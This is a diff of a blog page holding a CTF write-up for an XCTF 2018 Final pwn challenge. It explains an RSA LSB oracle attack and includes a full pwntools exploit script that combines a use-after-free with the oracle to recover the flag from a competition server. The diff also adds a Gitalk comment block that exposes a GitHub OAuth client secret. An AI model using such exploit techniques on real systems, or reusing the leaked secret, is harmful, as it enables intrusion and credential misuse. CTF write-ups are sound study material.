@@ -14,10 +14,12 @@
 
 
 <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"blog.kyrios.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+    var CONFIG = {"hostname":"blog.kyrios.cn","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
   <meta name="description" content="上周去北京打XCTF-Final，被各位大哥打到自闭。第一天长者复读了一道攻防pwn题，我做另一个带密码学的攻防pwn题，看了下流量，回到宾馆后终于调了出来。题目质量还不错，感谢JHSN和Cyrus的帮助，以下是wp。">
@@ -31,7 +33,7 @@
 <meta property="og:image" content="https://blog.kyrios.cn/xctf-2018-final-wp/img/railgun_uaf.png">
 <meta property="og:image" content="https://blog.kyrios.cn/xctf-2018-final-wp/img/railgun_comment.png">
 <meta property="article:published_time" content="2018-11-05T07:09:20.000Z">
-<meta property="article:modified_time" content="2020-09-12T21:24:49.502Z">
+<meta property="article:modified_time" content="2020-09-23T11:59:24.640Z">
 <meta property="article:author" content="Kyr1os">
 <meta property="article:tag" content="Crypto">
 <meta property="article:tag" content="PWN">
@@ -158,6 +160,7 @@
     <i class="fa fa-arrow-up"></i>
     <span>0%</span>
   </div>
+  <div class="reading-progress-bar"></div>
 
   <a href="https://github.com/kyrios0" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
 
@@ -204,7 +207,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-09-13 05:24:49" itemprop="dateModified" datetime="2020-09-13T05:24:49+08:00">2020-09-13</time>
+                <time title="Modified: 2020-09-23 19:59:24" itemprop="dateModified" datetime="2020-09-23T19:59:24+08:00">2020-09-23</time>
               </span>
 
           
@@ -236,10 +239,15 @@
 <p><img src="img/railgun_comment.png" /></p>
 <h3 id="rsa-lsb-oracle-attack">RSA LSB Oracle Attack</h3>
 <p>之后进入密码学时间</p>
-<p>已知n, e flag_cipher = pow(flag+padding, e, n)</p>
+<p>已知n, e;</p>
+<p>flag_cipher = pow(flag+padding, e, n)</p>
 <p>击杀Boss可以获得 AES_ecb(pow(input, d, n) % 16, Boss)</p>
 <p>因为Boss9已经被控制了，所以相当于返回的是pow(input, d, n) % 16</p>
-<p><strong>使用RSA LSB Oracle Attack</strong> 假设攻击者已知x个最后半字节，设未知部分为a，已知部分是b，则有<span class="math inline">\(f = a * 16^{x} + b\)</span> 令<span class="math inline">\(y = 16^{-x}\ mod\ n, Y = y^{e}\ mod\ n\)</span> 输入flag_cipher * Y， 则会返回<span class="math inline">\(fy = a + b * 16^{-x}\ mod\ n\ mod\ 16\)</span> 因为<span class="math inline">\(b * 16^{-x}\ mod\ 16\)</span>已知，所以可以求出<span class="math inline">\(a\ mod\ 16\)</span></p>
+<p><strong>使用RSA LSB Oracle Attack</strong></p>
+<p>假设攻击者已知x个最后半字节，设未知部分为a，已知部分是b，则有<span class="math inline">\(f = a * 16^{x} + b\)</span></p>
+<p>令<span class="math inline">\(y = 16^{-x}\ mod\ n, Y = y^{e}\ mod\ n\)</span></p>
+<p>输入<span class="math inline">\(flag_cipher * Y\)</span>， 则会返回<span class="math inline">\(fy = a + b * 16^{-x}\ mod\ n\ mod\ 16\)</span></p>
+<p>因为<span class="math inline">\(b * 16^{-x}\ mod\ 16\)</span>已知，所以可以求出<span class="math inline">\(a\ mod\ 16\)</span></p>
 <h3 id="exploit">Exploit</h3>
 <p>利用UAF控制Boss9的内容，然后用RSA LSB Oracle Attack逐半字节攻击出flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x: x+(chr(<span class="number">16</span>-len(x)) * (<span class="number">16</span>-len(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aesecb_decrypt</span>(<span class="params">enStr, key</span>):</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    enStr = pad(enStr)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(enStr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ex_gcd</span>(<span class="params">m, n</span>):</span></span><br><span class="line">    x, y, x1, y1 = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> m % n:</span><br><span class="line">        x, x1 = x1 - m // n * x, x</span><br><span class="line">        y, y1 = y1 - m // n * y, y</span><br><span class="line">        m, n = n, m % n</span><br><span class="line">    <span class="keyword">return</span> n, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mod_inv</span>(<span class="params">x, p</span>):</span></span><br><span class="line">    g, y, k = ex_gcd(x, p)</span><br><span class="line">    <span class="keyword">if</span> y &lt; p:</span><br><span class="line">        y += p</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[+]PoW:&#x27;</span>)</span><br><span class="line">    sha256 = p.recvuntil(<span class="string">&#x27;+&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    s = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x10000</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(s + p16(i)).hexdigest() == sha256:</span><br><span class="line">            p.sendline(p16(i).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]description:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]name:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;Kyr1os&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    n1 = get_pub(p)</span><br><span class="line">    inv16 = mod_inv(<span class="number">16</span>, n1)</span><br><span class="line">    flag_cipher = get_flag_cipher(p)</span><br><span class="line"></span><br><span class="line">    mining(p)</span><br><span class="line">    shoot(p, <span class="number">1</span>, <span class="string">&#x27;1&#x27;</span>*<span class="number">256</span>) <span class="comment"># get 1 - 2 = 255 coins</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;6&#x27;</span>) <span class="comment"># accerate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>): <span class="comment"># for remote</span></span><br><span class="line">        comment(p, <span class="number">18</span>, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">18</span>)</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    Y = <span class="number">1</span></span><br><span class="line">    b = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> round <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">        drop = shoot(p, <span class="number">9</span>, hex(flag_cipher * Y)[<span class="number">2</span>:].upper())</span><br><span class="line">        half_byte = aesecb_decrypt(drop.decode(<span class="string">&#x27;hex&#x27;</span>), <span class="string">&#x27;\x00&#x27;</span>*<span class="number">16</span>)[<span class="number">0</span>]</span><br><span class="line">        half_byte = (int(half_byte, <span class="number">16</span>)+<span class="number">16</span>-((b * pow(inv16, x, n1)) % n1 % <span class="number">16</span>)) % <span class="number">16</span></span><br><span class="line">        b += (half_byte * (<span class="number">16</span> ** x))</span><br><span class="line">        x += <span class="number">1</span></span><br><span class="line">        y = pow(inv16, x, n1)</span><br><span class="line">        Y = pow(y, e, n1)</span><br><span class="line">    <span class="keyword">print</span> hex(b)[<span class="number">2</span>:].decode(<span class="string">&#x27;hex&#x27;</span>) <span class="comment"># flag</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mining</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;mining:&#x27;</span>)</span><br><span class="line">    sha256 = p.recvuntil(<span class="string">&#x27;+&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    s = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0x10000</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(s + p16(i)).hexdigest() == sha256:</span><br><span class="line">            p.sendline(p16(i).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pub</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;pub:&#x27;</span>)</span><br><span class="line">    pub = p.recv(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> int(pub, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_cipher</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;attack\n[+]&#x27;</span>)</span><br><span class="line">    flagc = p.recv(<span class="number">256</span>)</span><br><span class="line">    <span class="keyword">return</span> int(flagc, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shoot</span>(<span class="params">p, boss_id, payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;boss:&#x27;</span>)</span><br><span class="line">    p.sendline(str(boss_id))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;send:&#x27;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;coins(1/0):&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;pickup:&#x27;</span>)</span><br><span class="line">    cipher = p.recv(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">comment</span>(<span class="params">p, len, payload</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;[-]&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;lenth:&#x27;</span>)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;comment:&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __init__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;192.168.17.12&#x27;</span>, <span class="number">20002</span>)</span><br><span class="line">    pwn(p)</span><br></pre></td></tr></table></figure>
@@ -287,6 +295,7 @@
 
           </div>
           
+    <div class="comments" id="gitalk-container"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -354,8 +363,10 @@
         </a>
       </div>
       <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
         <span class="site-state-item-count">11</span>
-        <span class="site-state-item-name">tags</span>
+        <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
@@ -365,6 +376,9 @@
       </span>
       <span class="links-of-author-item">
         <a href="mailto:kyr1os@qq.com" title="E-Mail → mailto:kyr1os@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://osu.ppy.sh/users/11500292" title="OSU → https:&#x2F;&#x2F;osu.ppy.sh&#x2F;users&#x2F;11500292" rel="noopener" target="_blank"><i class="fa fa-headphones fa-fw"></i>OSU</a>
       </span>
   </div>
 
@@ -528,6 +542,26 @@
     
 
   
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '6cd5e006f4344b4ef21b',
+      clientSecret: 'ee2b76bf152d51927924c4699df0df26805c9aab',
+      repo        : 'kyrios0.github.io',
+      owner       : 'kyrios0',
+      admin       : ['kyrios0'],
+      id          : '3432c00988619a4d08971aeb139d09e9',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
 
 </body>
 </html>
